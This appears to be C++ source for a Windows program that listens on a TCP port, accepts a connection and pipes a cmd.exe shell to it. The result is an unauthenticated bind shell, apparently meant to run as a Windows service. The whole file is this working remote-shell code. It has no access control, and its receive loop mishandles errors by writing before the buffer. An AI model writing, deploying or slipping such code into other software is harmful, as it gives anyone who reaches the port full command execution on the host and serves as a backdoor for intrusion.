#undef UNICODE

#define WIN32_LEAN_AND_MEAN

#include "Server.h"
#include "SVC.h"
//using namespace std;

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
// #pragma comment (lib, "Mswsock.lib")
LPSTR cmdpath = LPSTR("C:\\Windows\\System32\\cmd.exe");

HANDLE hChildProcess = NULL;
WSADATA wsaData;
SOCKET ListenSocket = INVALID_SOCKET;
SOCKET ClientSocket = INVALID_SOCKET;

Server::Server() {
}

void runCommand(HANDLE hChildStdOut, HANDLE hChildStdIn, HANDLE hChildStdErr)
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si;

	// Set up the start up info struct.
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdOutput = hChildStdOut;
	si.hStdInput = hChildStdIn;
	si.hStdError = hChildStdErr;

	if (!CreateProcess(NULL,
		cmdpath,
		NULL,
		NULL,
		TRUE,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi))
		printf("CreateProcess");


	// Set global child process handle to cause threads to exit.
	hChildProcess = pi.hProcess;


	// Close any unnecessary handles.
	if (!CloseHandle(pi.hThread)) printf("CloseHandle");
}

DWORD WINAPI StdInputFromSocketToPipe(LPVOID lpvThreadParam) {
	HANDLE hPipe = (HANDLE)lpvThreadParam;
	char recvbuf[DEFAULT_BUFLEN+2];
	int recvbuflen = DEFAULT_BUFLEN;
	DWORD nBytesWrote;
	while (true) {

		int iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
		recvbuf[iResult] = '\n'; //TODO remove
		recvbuf[iResult+1] = '\0'; //TODO remove
		if (iResult > 0) {
			
			if (!WriteFile(hPipe, recvbuf, iResult + 1, &nBytesWrote, NULL)) {
				printf("WRITE FILE ERROR %lu\n", GetLastError());
				break;
			}
			printf("StdInputFromSocketToPipe received: %s\n\n", recvbuf);
		}
		else if (iResult == 0) {

		}
		else {
			printf("recv failed with error: %d\n", WSAGetLastError());
			closesocket(ClientSocket); //TODO not here, but if WaitForMultipleObjects
			WSACleanup();
			return 1;
		}
	}
}

DWORD WINAPI StdOutputFromPipeToSocket(LPVOID lpvThreadParam) {
	HANDLE hPipe = (HANDLE)lpvThreadParam;
	char sendbuf[DEFAULT_BUFLEN+1];
	int sendbuflen = DEFAULT_BUFLEN;
	DWORD nBytesRead;
	while(true){
		if (!ReadFile(hPipe, sendbuf, sendbuflen, &nBytesRead, NULL) || !nBytesRead)
		{
			printf("READ FILE ERROR %lu\n", GetLastError());
			break;
		}
		sendbuf[nBytesRead] = '\0'; //TODO remove

		int iSendResult = send(ClientSocket, sendbuf, nBytesRead, 0);
		if (iSendResult == SOCKET_ERROR) {
			printf("send failed with error: %d\n", WSAGetLastError());
			closesocket(ClientSocket); //TODO not here, but if WaitForMultipleObjects
			WSACleanup();
			return 1;
		}
		printf("Bytes sent: %d\n", iSendResult);
	}
}

int setupSockets() {
	// Initialize Winsock
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	struct addrinfo *result = NULL;
	struct addrinfo hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	// Resolve the server address and port
	iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		printf("bind failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);

	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	// Accept a client socket
	ClientSocket = accept(ListenSocket, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		printf("accept failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	// No longer need server socket
	closesocket(ListenSocket);
	return 0;
}

int closeServer() {
	int iResult = shutdown(ClientSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		return 1;
	}

	// cleanup
	closesocket(ClientSocket);
	WSACleanup();
	return 0;
}

int Server::startServer() {

	return setupSockets();

	// Receive until the peer shuts down the connection

	// shutdown the connection since we're done


}




int main() {
	//_ttmain(0, NULL);//Now only as a service
	Server server = Server();
	if (server.startServer() == 1) {
		printf("SETUP SOCKET FAILED");
		return -1;
	}
	
	SECURITY_ATTRIBUTES saAttr;

	printf("\n->Start of parent execution.\n");

	// Set the bInheritHandle flag so pipe handles are inherited. 

	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	// Starting to create pipes
	HANDLE hStdOutputReadTmp, hStdOutputCmdForWriting, hStdErrorCmdForWriting;
	HANDLE hStdInputWriteTmp, hStdInputCmdForReading;

	HANDLE hThread1, hThread2;
	DWORD ThreadId1, ThreadId2;

	// Set up the security attributes struct.
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.lpSecurityDescriptor = NULL;
	saAttr.bInheritHandle = TRUE;

	// Create the child output pipe.
	if (!CreatePipe(&hStdOutputReadTmp, &hStdOutputCmdForWriting, &saAttr, 0))
		printf("CreatePipe\n");


	// Create a duplicate of the output write handle for the std error
	// write handle. This is necessary in case the child application
	// closes one of its std output handles.
	if (!DuplicateHandle(GetCurrentProcess(), hStdOutputCmdForWriting,
		GetCurrentProcess(), &hStdErrorCmdForWriting, 0,
		TRUE, DUPLICATE_SAME_ACCESS))
		printf("DuplicateHandle\n");


	// Create the child input pipe.
	if (!CreatePipe(&hStdInputCmdForReading, &hStdInputWriteTmp, &saAttr, 0))
		printf("CreatePipe\n");

	HANDLE hStdOutputRead, hStdInputWrite;

	// Create new output read handle and the input write handles. Set
	// the Properties to FALSE. Otherwise, the child inherits the
	// properties and, as a result, non-closeable handles to the pipes
	// are created.
	if (!DuplicateHandle(GetCurrentProcess(), hStdOutputReadTmp,
		GetCurrentProcess(),
		&hStdOutputRead, // Address of new handle.
		0, FALSE, // Make it uninheritable.
		DUPLICATE_SAME_ACCESS))
		printf("DuplicateHandle\n");

	if (!DuplicateHandle(GetCurrentProcess(), hStdInputWriteTmp,
		GetCurrentProcess(),
		&hStdInputWrite, // Address of new handle.
		0, FALSE, // Make it uninheritable.
		DUPLICATE_SAME_ACCESS))
		printf("DuplicateHandle\n");


	// Close inheritable copies of the handles you do not want to be
	// inherited.
	//if (!CloseHandle(hStdOutputReadTmp)) printf("CloseHandle");
	//if (!CloseHandle(hStdInputWriteTmp)) printf("CloseHandle");

	runCommand(hStdOutputCmdForWriting, hStdInputCmdForReading, hStdErrorCmdForWriting);
	printf("RUN COMMAND FINISHED!\n");

	/* - later
	if (!CloseHandle(hStdOutputCmdForWriting)) {
		printf("CloseHandle hOutputWrite ERROR\n");
	}

	if (!CloseHandle(hStdInputCmdForReading)) {
		printf("CloseHandle hInputRead ERROR\n");
	}

	if (!CloseHandle(hStdErrorCmdForWriting)) {
		printf("CloseHandle hErrorWrite ERROR\n");
	}
	*/

	hThread1 = CreateThread(NULL, 0, StdOutputFromPipeToSocket, (LPVOID)hStdOutputRead, 0, &ThreadId1);
	if (hThread1 == NULL) printf("StdOutputFromPipeToSocket CreateThread Failed");

	hThread2 = CreateThread(NULL, 0, StdInputFromSocketToPipe, (LPVOID)hStdInputWrite, 0, &ThreadId2);
	if (hThread2 == NULL) printf("StdInputFromSocketToPipe CreateThread Failed");

	if (WaitForSingleObject(hThread1, INFINITE) == WAIT_FAILED)
		printf("WaitForSingleObject");

	if (WaitForSingleObject(hThread2, INFINITE) == WAIT_FAILED)
		printf("WaitForSingleObject");

	if (!CloseHandle(hStdOutputRead)) printf("CloseHandle");
	if (!CloseHandle(hStdInputWrite)) printf("CloseHandle");

	// Write to the pipe that is the standard input for a child process. 
	// Data is written to the pipe's buffers, so it is not necessary to wait
	// until the child process is running before writing data.

	//WriteToPipe();
//	printf("\n->Contents of %s written to child STDIN pipe.\n", "BLABLABLA");

	// Read from pipe that is the standard output for child process. 

	//printf("\n->Contents of child process STDOUT:\n\n", "BLABLABLA");
	//ReadFromPipe();

	printf("\n->End of parent execution.\n");

	// The remaining open handles are cleaned up when this process terminates. 
	// To avoid resource leaks in a larger application, close handles explicitly. 

	return 0;
}

